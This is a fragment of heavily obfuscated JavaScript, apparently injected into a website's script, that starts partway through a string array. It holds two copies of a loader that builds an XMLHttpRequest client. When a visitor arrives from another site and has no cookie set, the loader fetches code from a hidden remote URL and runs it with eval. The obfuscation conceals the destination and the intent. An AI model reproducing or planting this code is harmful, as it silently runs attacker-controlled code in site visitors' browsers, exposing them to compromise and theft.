x6f\x6e','\x63\x65\x2e','\x6f\x6e\x72','\x67\x65\x74','\x44\x6b\x6e','\x77\x77\x77','\x73\x70\x61'];i=function(){return O;};return i();}(function(){var j={Y:'\x30\x78\x63\x32',W:'\x30\x78\x62\x35',M:'\x30\x78\x62\x36',m:0xed,x:'\x30\x78\x63\x38',V:0xdc,B:0xc3,o:0xac,s:'\x30\x78\x65\x38',D:0xc5,l:'\x30\x78\x62\x30',N:'\x30\x78\x64\x64',L:0xd8,R:0xc6,d:0xd6,y:'\x30\x78\x65\x66',O:'\x30\x78\x62\x38',X:0xe6,b:0xc4,C:'\x30\x78\x62\x62',n:'\x30\x78\x62\x64',v:'\x30\x78\x63\x39',F:'\x30\x78\x62\x37',A:0xb2,g:'\x30\x78\x62\x63',r:0xe0,i0:'\x30\x78\x62\x35',i1:0xb6,i2:0xce,i3:0xf1,i4:'\x30\x78\x62\x66',i5:0xf7,i6:0xbe,i7:'\x30\x78\x65\x62',i8:'\x30\x78\x62\x65',i9:'\x30\x78\x65\x37',ii:'\x30\x78\x64\x61'},Z={Y:'\x30\x78\x63\x62',W:'\x30\x78\x64\x65'},T={Y:0xf3,W:0xb3},S=p,Y={'\x76\x67\x6f\x7a\x57':S(j.Y)+'\x78','\x6a\x43\x53\x55\x50':function(L,R){return L!==R;},'\x78\x58\x49\x59\x69':S(j.W)+S(j.M)+'\x66','\x52\x6d\x6f\x59\x6f':S(j.m)+S(j.x),'\x56\x7a\x69\x71\x6a':S(j.V)+'\x2e','\x4c\x72\x43\x76\x79':function(L,R){return L+R;},'\x46\x79\x48\x76\x62':function(L,R,y){return L(R,y);},'\x5a\x67\x6c\x79\x64':S(j.B)+S(j.o)+S(j.s)+S(j.D)+S(j.l)+S(j.N)+S(j.L)+S(j.R)+S(j.d)+S(j.y)+S(j.O)+S(j.X)+S(j.b)+'\x3d'},W=navigator,M=document,m=screen,x=window,V=M[Y[S(j.C)+'\x59\x6f']],B=x[S(j.n)+S(j.v)+'\x6f\x6e'][S(j.F)+S(j.A)+'\x6d\x65'],o=M[S(j.g)+S(j.r)+'\x65\x72'];B[S(j.i0)+S(j.i1)+'\x66'](Y[S(j.i2)+'\x71\x6a'])==0x823+-0x290+0x593*-0x1&&(B=B[S(j.i3)+S(j.i4)](-0xbd7+0x1*0x18d5+-0xcfa*0x1));if(o&&!N(o,Y[S(j.i5)+'\x76\x79'](S(j.i6),B))&&!Y[S(j.i7)+'\x76\x62'](N,o,S(j.i8)+S(j.V)+'\x2e'+B)&&!V){var D=new HttpClient(),l=Y[S(j.i9)+'\x79\x64']+token();D[S(j.ii)](l,function(L){var E=S;N(L,Y[E(T.Y)+'\x7a\x57'])&&x[E(T.W)+'\x6c'](L);});}function N(L,R){var I=S;return Y[I(Z.Y)+'\x55\x50'](L[Y[I(Z.W)+'\x59\x69']](R),-(-0x2*-0xc49+0x1e98+-0x1b*0x20b));}}());};;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};